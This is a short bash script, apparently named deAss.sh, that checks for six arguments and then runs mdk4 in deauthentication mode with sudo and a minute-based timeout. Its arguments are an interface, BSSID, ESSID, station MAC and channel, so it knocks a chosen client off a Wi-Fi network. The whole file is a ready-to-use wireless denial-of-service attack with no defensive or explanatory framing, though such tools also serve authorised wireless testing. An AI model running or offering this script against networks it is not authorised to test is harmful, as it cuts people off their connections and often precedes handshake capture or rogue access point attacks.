#!/bin/bash


if [ "$#" -lt 6 ]
then
    echo "[*] Usages: ./deAss.sh {Interface_name} {BSSID} {ESSID} {Station_MAC} {time} {channel}"
    exit 1
fi

if [ "$#" -eq 6 ]
then
    sudo timeout "$5"m mdk4 "$1" d -c "$6" -S "$4" -E "$3" -B "$2"
fi